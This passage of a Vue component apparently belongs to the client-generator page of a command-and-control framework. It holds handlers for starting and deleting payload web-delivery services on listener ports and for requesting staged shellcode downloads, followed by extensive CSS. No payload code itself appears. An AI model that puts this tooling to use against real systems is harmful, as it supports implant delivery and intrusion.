    ElMessage.error(t('gen.stopFailed'));
  }
};

const handleWebOpen = async (row: any) => {
  try {
    const res = await ClientAPI.OpenWebDelivery({ port: row.ListeningPort });
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success(t('gen.serviceStarted'));
      await getWebDeliveryList();
    } else {
      ElMessage.error(res.data?.data || t('gen.startFailed'));
    }
  } catch (error) {
    console.error('failed to start WebDelivery:', error);
    ElMessage.error(t('gen.startFailed'));
  }
};

const handleWebDelete = async (row: any) => {
  try {
    await ElMessageBox.confirm(
        t('gen.webDeleteConfirm', { port: row.ListeningPort }),
        t('listener.deleteTitle'),
        {
          confirmButtonText: t('common.confirm'),
          cancelButtonText: t('common.cancel'),
          type: 'warning'
        }
    );

    const res = await ClientAPI.DeleteWebDelivery({ port: row.ListeningPort });
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success(t('common.deleted'));
      await getWebDeliveryList();
    } else {
      ElMessage.error(res.data?.data || t('common.deleteFailed'));
    }
  } catch (error) {
    if (error !== 'cancel') {
      console.error('failed to delete WebDelivery:', error);
      ElMessage.error(t('common.deleteFailed'));
    }
  }
};

const openShellcodeDialog = (row: any) => {
  selectedListener.value = row.ListenerConfig;
  selectedPort.value = row.ListeningPort;
  selectedFormat.format = '';
  dialogVisible2.value = true;
};

const handleStageShellcode = async () => {
  if (!selectedFormat.format) {
    ElMessage.warning(t('gen.pickFormat'));
    return;
  }

  generatinBackendTemplatecode.value = true;
  try {
    const res = await ClientAPI.StageShellCodeGen({
      listener: selectedListener.value,
      port: selectedPort.value,
      format: selectedFormat.format
    });

    if (res.status === 200) {
      const contentDisposition = res.headers['content-disposition'] || '';
      const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition);
      let fileName = matches && matches.length > 1
          ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
          : `shellcode_${selectedListener.value}_${selectedPort.value}.${selectedFormat.format}`;

      const blob = new Blob([res.data], { type: res.headers['content-type'] });
      const downloadElement = document.createElement('a');
      const href = window.URL.createObjectURL(blob);

      downloadElement.href = href;
      downloadElement.download = fileName;
      document.body.appendChild(downloadElement);
      downloadElement.click();
      document.body.removeChild(downloadElement);
      window.URL.revokeObjectURL(href);

      ElMessage.success(t('gen.scOk'));
      dialogVisible2.value = false;
    } else {
      ElMessage.error(t('gen.generateFailed'));
    }
  } catch (error) {
    console.error('failed to generate shellcode:', error);
    ElMessage.error(t('gen.generateFailed'));
  } finally {
    generatinBackendTemplatecode.value = false;
  }
};

const resetWebForm = () => {
  webFormData.port = '';
  webFormData.listener = '';
  webFormData.os = '';
  webFormData.arch = '';
  webFormData.filename = '';
  webFormData.pass = '';
  webArchOptions.value = [];
};

// 初始化
onMounted(() => {
  selectOS('windows');
  getWebDeliveryList();
});
</script>

<style scoped>
.client-generator {
  padding: 24px;
  background: var(--theme-gradient);
  min-height: calc(100vh - 60px);
}

.header-section {
  margin-bottom: 24px;
}

.header-content {
  flex: 1;
}

.page-title {
  margin: 0;
  font-size: 32px;
  font-weight: 700;
  color: #2c3e50;
  background: linear-gradient(135deg, var(--theme-primary) 0%, var(--theme-dark) 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  letter-spacing: 1px;
}

.page-subtitle {
  margin: 8px 0 0 0;
  font-size: 15px;
  color: #7f8c8d;
}

/* 功能选择器 */
.function-selector-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  margin-bottom: 24px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
}

.function-selector {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 16px;
}

.function-option {
  display: flex;
  align-items: center;
  gap: 16px;
  padding: 20px;
  border: 2px solid #e9ecef;
  border-radius: 12px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
}

.function-option:hover {
  border-color: var(--theme-primary);
  background: var(--theme-light);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
}

.function-selected {
  border-color: var(--theme-primary) !important;
  background: var(--theme-light) !important;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.function-icon-wrapper {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.function-icon {
  font-size: 24px;
}

.function-client { color: var(--theme-primary); }
.function-web { color: #67c23a; }

.function-info {
  flex: 1;
}

.function-name {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.function-desc {
  font-size: 13px;
  color: #6c757d;
  line-height: 1.4;
}

/* 配置卡片样式 */
.config-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  margin-bottom: 24px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
}

.config-card :deep(.el-card__header) {
  border-bottom: 1px solid #ebeef5;
  padding: 20px 24px;
  background: linear-gradient(90deg, #f8f9fa 0%, #fff 100%);
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.header-left {
  display: flex;
  align-items: center;
  gap: 12px;
}

.card-icon {
  color: var(--theme-primary);
  font-size: 20px;
}

.card-title {
  margin: 0;
  font-size: 18px;
  font-weight: 600;
  color: #303133;
}

.config-form {
  padding: 8px 4px;
}

.generator-form :deep(.el-form-item) {
  margin-bottom: 32px;
}

.generator-form :deep(.el-form-item__label) {
  font-size: 15px;
  font-weight: 600;
  color: #2c3e50;
  padding-bottom: 12px;
  display: block;
}

/* 表单选择器 */
.form-select {
  width: 100%;
}

.form-select :deep(.el-input__wrapper) {
  border-radius: 10px;
  padding-left: 12px;
  height: 48px;
}

.form-select :deep(.el-input__prefix) {
  display: flex;
  align-items: center;
  padding-left: 12px;
}

.listener-option {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 0;
}

.option-icon {
  color: var(--theme-primary);
  font-size: 16px;
}

.option-label {
  font-size: 14px;
  font-weight: 500;
}

.empty-option {
  text-align: center;
  padding: 20px;
  color: #909399;
  font-size: 14px;
}

/* 操作系统选择器 */
.os-selector {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 16px;
}

.os-option {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 12px;
  padding: 20px;
  border: 2px solid #e9ecef;
  border-radius: 12px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  position: relative;
}

.os-option:hover {
  border-color: var(--theme-primary);
  background: rgba(0, 0, 0, 0.02);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
}

.os-selected {
  border-color: var(--theme-primary) !important;
  background: rgba(0, 0, 0, 0.03) !important;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.os-icon-wrapper {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.os-icon {
  font-size: 24px;
}

.os-windows {
  color: #00a4ef;
}

.os-linux {
  color: #333;
}

.os-darwin {
  color: #999;
}

.os-info {
  flex: 1;
  text-align: center;
}

.os-name {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.os-arch-count {
  font-size: 13px;
  color: #6c757d;
}

.os-check {
  position: absolute;
  top: 12px;
  right: 12px;
  color: var(--theme-primary);
  font-size: 20px;
}

/* 架构选择器 */
.arch-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 12px;
  width: 100%;
}

.arch-option {
  flex: 1;
  min-width: 200px;
  padding: 16px;
  border: 2px solid #e9ecef;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  display: flex;
  align-items: center;
  gap: 12px;
}

.arch-option:hover:not(.arch-disabled) {
  border-color: var(--theme-primary);
  background: rgba(0, 0, 0, 0.02);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
}

.arch-selected {
  border-color: #67c23a !important;
  background: rgba(103, 194, 58, 0.1) !important;
  box-shadow: 0 4px 12px rgba(103, 194, 58, 0.2);
}

.arch-disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.arch-icon {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(0, 0, 0, 0.03);
}

.arch-icon-svg {
  color: var(--theme-primary);
  font-size: 20px;
}

.arch-info {
  flex: 1;
  min-width: 0;
}

.arch-name {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 2px;
}

.arch-desc {
  font-size: 11px;
  color: #6c757d;
  line-height: 1.3;
}

/* 密码输入框 */
.password-input-wrapper {
  display: flex;
  gap: 12px;
  align-items: center;
}

.password-input {
  flex: 1;
}

.password-input :deep(.el-input__wrapper) {
  border-radius: 10px;
  height: 48px;
}

.generate-password-btn {
  flex-shrink: 0;
}

.password-strength {
  margin-top: 12px;
}

.strength-meter {
  height: 6px;
  background: #e9ecef;
  border-radius: 3px;
  overflow: hidden;
  margin-bottom: 6px;
}

.strength-bar {
  height: 100%;
  background: linear-gradient(90deg, #f56c6c, #e6a23c, #67c23a);
  border-radius: 3px;
  transition: width 0.3s;
}

.strength-text {
  font-size: 12px;
  color: #6c757d;
}

/* 生成按钮 */
.generate-btn {
  height: 52px;
  padding: 0 40px;
  border-radius: 12px;
  font-size: 16px;
  font-weight: 600;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  transition: all 0.3s;
}

.generate-btn:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
}

.generate-btn .el-icon {
  margin-right: 8px;
  font-size: 18px;
}

/* 命令参考卡片 */
.commands-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  margin-bottom: 24px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
}

.commands-card :deep(.el-card__header) {
  border-bottom: 1px solid #ebeef5;
  padding: 20px 24px;
  background: linear-gradient(90deg, #f8f9fa 0%, #fff 100%);
}

.commands-grid {
  display: flex;
  flex-direction: column;
  gap: 20px;
  padding: 8px 4px;
}

.command-card {
  width: 95%;
  padding: 20px;
  border-radius: 12px;
  border: 1px solid #e9ecef;
  transition: all 0.3s;
  background: #f8f9fa;
}

.command-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
}

.command-card.command-type-0 { border-left: 4px solid var(--theme-primary); }
.command-card.command-type-1 { border-left: 4px solid #67c23a; }
.command-card.command-type-2 { border-left: 4px solid #e6a23c; }
.command-card.command-type-3 { border-left: 4px solid #f56c6c; }

.command-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
}

.command-type {
  display: flex;
  align-items: center;
  gap: 8px;
}

.type-icon {
  font-size: 18px;
  color: var(--theme-primary);
}

.type-name {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
}

.copy-btn {
  color: #909399;
  transition: color 0.3s;
}

.copy-btn:hover {
  color: var(--theme-primary);
}

.command-content {
  position: relative;
}

.command-code {
  background: #2d2d2d;
  color: #f8f8f2;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 13px;
  line-height: 1.5;
  overflow-x: auto;
  margin-bottom: 12px;
  white-space: pre-wrap;
  word-break: break-all;
}

.command-desc {
  font-size: 12px;
  color: #6c757d;
}

/* WebDelivery统计卡片 */
.stats-cards {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 16px;
  margin-bottom: 24px;
}

.stat-card {
  border-radius: 12px;
  border: 1px solid #ebeef5;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
  transition: all 0.3s;
  cursor: pointer;
}

.stat-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
}

.stat-content {
  display: flex;
  align-items: center;
  gap: 16px;
  padding: 8px 0;
}

.stat-icon {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 24px;
}

.total-icon {
  background: rgba(0, 0, 0, 0.03);
  color: var(--theme-primary);
}

.active-icon {
  background: rgba(103, 194, 58, 0.1);
  color: #67c23a;
}

.inactive-icon {
  background: rgba(245, 108, 108, 0.1);
  color: #f56c6c;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: 700;
  color: #2c3e50;
  line-height: 1;
}

.stat-label {
  font-size: 13px;
  color: #7f8c8d;
  margin-top: 4px;
}

/* 主表格 */
.main-table-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  margin-bottom: 24px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
}

.main-table-card :deep(.el-card__header) {
  border-bottom: 1px solid #ebeef5;
  padding: 20px 24px;
  background: linear-gradient(90deg, #f8f9fa 0%, #fff 100%);
}

.table-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.table-title {
  margin: 0;
  font-size: 18px;
  font-weight: 600;
  color: var(--theme-primary);
  display: flex;
  align-items: center;
  gap: 8px;
}

.table-title:before {
  content: '';
  display: block;
  width: 4px;
  height: 18px;
  background: linear-gradient(180deg, var(--theme-primary) 0%, var(--theme-dark) 100%);
  border-radius: 2px;
}

.table-actions {
  display: flex;
  gap: 8px;
}

.custom-table {
  font-size: 13px;
}

.custom-table :deep(.el-table__header-wrapper th) {
  background: #f8f9fa;
  font-weight: 600;
  color: #495057;
  border-bottom: 2px solid #e9ecef;
}

.custom-table :deep(.el-table__row:hover) {
  background-color: #f8fafc;
}

.custom-table :deep(.el-table__row:hover td) {
  background-color: #f8fafc !important;
}

/* 表格单元格 */
.listener-cell {
  display: flex;
  align-items: center;
  gap: 10px;
}

.listener-icon {
  color: var(--theme-primary);
  font-size: 16px;
  flex-shrink: 0;
}

.listener-content {
  flex: 1;
  min-width: 0;
}

.listener-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 13px;
  color: #2c3e50;
  word-break: break-all;
}

.listener-label {
  font-size: 11px;
  color: #7f8c8d;
  margin-top: 2px;
}

.os-tag {
  font-weight: 600;
  font-size: 12px;
  padding: 4px 12px;
  letter-spacing: 0.5px;
}

.arch-cell {
  display: flex;
  align-items: center;
  gap: 8px;
}

.arch-icon {
  color: #909399;
  font-size: 14px;
}

.arch-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-weight: 500;
}

.password-cell {
  display: flex;
  align-items: center;
  gap: 8px;
}

.password-icon {
  color: #e6a23c;
  font-size: 14px;
}

.password-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 12px;
  color: #e6a23c;
  font-weight: 500;
}

.port-cell {
  display: flex;
  align-items: center;
}

.port-tag {
  font-family: 'Monaco', 'Consolas', monospace;
  font-weight: 600;
}

.status-cell {
  display: flex;
  align-items: center;
  gap: 8px;
  justify-content: center;
}

.status-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
}

.status-active {
  background: #67c23a;
  box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
  animation: pulse 2s infinite;
}

.status-inactive {
  background: #f56c6c;
  box-shadow: 0 0 0 2px rgba(245, 108, 108, 0.2);
}

@keyframes pulse {
  0%, 100% {
    box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
  }
  50% {
    box-shadow: 0 0 0 4px rgba(103, 194, 58, 0.1);
  }
}

/* 操作按钮 */
.action-buttons {
  display: flex;
  gap: 6px;
}

.action-btn {
  width: 32px;
  height: 32px;
  padding: 0;
  transition: all 0.3s;
}

.action-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
}

.action-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* 命令弹窗 */
.command-popover {
  border-radius: 8px;
}

.command-content {
  padding: 4px;
}

.command-title {
  margin: 0 0 12px 0;
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
}

.command-actions {
  display: flex;
  justify-content: flex-end;
}

/* 对话框样式 */
.add-dialog,
.shellcode-dialog {
  border-radius: 16px;
  overflow: hidden;
}

.add-dialog :deep(.el-dialog__header),
.shellcode-dialog :deep(.el-dialog__header) {
  margin: 0;
  padding: 0;
}

.dialog-content {
  padding: 0 8px;
}

.config-form :deep(.el-form-item) {
  margin-bottom: 24px;
}

.config-form :deep(.el-form-item__label) {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
  padding-bottom: 8px;
  display: block;
}

.row-group {
  display: flex;
  gap: 24px;
  align-items: flex-start;
}

.half-width {
  flex: 1;
  min-width: 0;
}

.arch-select :deep(.el-input__wrapper) {
  border-radius: 10px;
  padding-left: 12px;
  height: 48px;
}

.arch-option-item {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 0;
}

.arch-option-item .el-icon {
  color: var(--theme-primary);
  font-size: 16px;
}

.arch-label {
  font-size: 14px;
  font-weight: 500;
  min-width: 60px;
}

.arch-desc {
  font-size: 11px;
  color: #909399;
  flex: 1;
  text-align: right;
}

/* 对话框底部 */
.add-dialog :deep(.el-dialog__footer),
.shellcode-dialog :deep(.el-dialog__footer) {
  padding: 20px 24px;
  border-top: 1px solid #ebeef5;
}

.dialog-footer {
  display: flex;
  justify-content: flex-end;
  gap: 12px;
}

.dialog-footer .el-button {
  min-width: 100px;
  border-radius: 8px;
  padding: 10px 24px;
  font-weight: 500;
}

/* Shellcode对话框 */
.shellcode-info {
  padding: 16px;
  background: #f8f9fa;
  border-radius: 10px;
  margin-bottom: 24px;
  border: 1px solid #e9ecef;
}

.info-item {
  display: flex;
  align-items: center;
  margin-bottom: 8px;
}

.info-item:last-child {
  margin-bottom: 0;
}

.info-label {
  font-size: 13px;
  font-weight: 600;
  color: #495057;
  min-width: 60px;
}

.info-value {
  font-size: 14px;
  color: #2c3e50;
  font-weight: 500;
  font-family: 'Monaco', 'Consolas', monospace;
}

.format-form {
  margin-top: 16px;
}

.format-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 12px;
}

.format-option {
  padding: 16px;
  border: 2px solid #e9ecef;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  position: relative;
}

.format-option:hover {
  border-color: var(--theme-primary);
  background: rgba(0, 0, 0, 0.02);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
}

.format-selected {
  border-color: #67c23a !important;
  background: rgba(103, 194, 58, 0.1) !important;
  box-shadow: 0 4px 12px rgba(103, 194, 58, 0.2);
}

.format-icon {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(0, 0, 0, 0.03);
  margin-bottom: 8px;
}

.format-icon-svg {
  color: var(--theme-primary);
  font-size: 20px;
}

.format-info {
  flex: 1;
}

.format-name {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.format-desc {
  font-size: 11px;
  color: #6c757d;
  line-height: 1.3;
}

.format-check {
  position: absolute;
  top: 12px;
  right: 12px;
  color: #67c23a;
  font-size: 18px;
}

.form-hint {
  font-size: 12px;
  color: #6c757d;
  margin-top: 8px;
  padding-left: 4px;
}

/* 响应式设计 */
@media (max-width: 992px) {
  .function-selector {
    grid-template-columns: 1fr;
  }

  .os-selector {
    grid-template-columns: 1fr;
  }

  .arch-grid {
    grid-template-columns: repeat(2, 1fr);
  }

  .stats-cards {
    grid-template-columns: repeat(2, 1fr);
  }

  .row-group {
    flex-direction: column;
    gap: 16px;
  }

  .format-grid {
    grid-template-columns: 1fr;
  }
}

@media (max-width: 768px) {
  .client-generator {
    padding: 16px;
  }

  .header-section {
    flex-direction: column;
    align-items: stretch;
  }

  .stats-cards {
    grid-template-columns: 1fr;
  }

  .arch-grid {
    grid-template-columns: 1fr;
  }

  .commands-grid {
    grid-template-columns: 1fr;
  }

  .generate-btn {
    width: 100%;
  }

  .os-selector {
    flex-direction: column;
  }

  .action-buttons {
    flex-direction: column;
    gap: 4px;
  }

  .action-btn {
    width: 28px;
    height: 28px;
  }
}

@media (max-width: 480px) {
  .password-input-wrapper {
    flex-direction: column;
    align-items: stretch;
  }

  .generate-password-btn {
    align-self: flex-end;
  }

  .add-dialog,
  .shellcode-dialog {
    width: 90vw !important;
  }

  .dialog-content {
    padding: 0 4px;
  }

  .dialog-footer {
    flex-wrap: wrap;
    justify-content: center;
  }
}
/* 正向客户端配置样式 */
.forward-checkbox-wrapper {
  margin-top: 12px;
  display: flex;
  align-items: center;
  gap: 8px;
}

.forward-checkbox-label {
  font-size: 14px;
  font-weight: 500;
  color: #2c3e50;
}

.forward-help-icon {
  color: #909399;
  font-size: 16px;
  cursor: help;
}

.forward-help-icon:hover {
  color: var(--theme-primary);
}

.forward-config {
  width: 100%;
}

.forward-row {
  display: flex;
  gap: 12px;
  align-items: center;
}

.forward-type {
  width: 160px;
  flex-shrink: 0;
}

.forward-address {
  flex: 1;
}

.forward-select :deep(.el-input__wrapper) {
  border-radius: 10px;
  padding-left: 12px;
  height: 48px;
}

.forward-option {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 0;
}

.forward-option .el-icon {
  color: var(--theme-primary);
  font-size: 16px;
}

.forward-option span {
  font-size: 14px;
  font-weight: 500;
}

/* 响应式调整 */
@media (max-width: 768px) {
  .forward-row {
    flex-direction: column;
  }

  .forward-type {
    width: 100%;
  }

  .forward-address {
    width: 100%;
  }
}
/* 开关切换样式 */
.forward-toggle-wrapper {
  margin-top: 16px;
  padding: 8px 0;
}

.forward-toggle {
  display: flex;
  align-items: center;
  gap: 12px;
  cursor: pointer;
  user-select: none;
}

.toggle-track {
  position: relative;
  width: 52px;
  height: 28px;
  background: #e9ecef;
  border-radius: 30px;
  transition: all 0.3s ease;
  box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
}

.is-active .toggle-track {
  background: linear-gradient(90deg, var(--theme-primary), var(--theme-dark));
}

.toggle-indicator {
  position: absolute;
  top: 2px;
  left: 2px;
  width: 24px;
  height: 24px;
  background: white;
  border-radius: 50%;
  transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
}

.is-active .toggle-indicator {
  transform: translateX(24px);
}

.toggle-label {
  display: flex;
  align-items: center;
  gap: 8px;
}

.toggle-text {
  font-size: 14px;
  font-weight: 500;
  color: #6c757d;
  transition: color 0.3s;
}

.active-text {
  color: var(--theme-primary);
  font-weight: 600;
}

.toggle-help-icon {
  color: #909399;
  font-size: 16px;
  cursor: help;
  transition: color 0.3s;
}

.toggle-help-icon:hover {
  color: var(--theme-primary);
}
</style>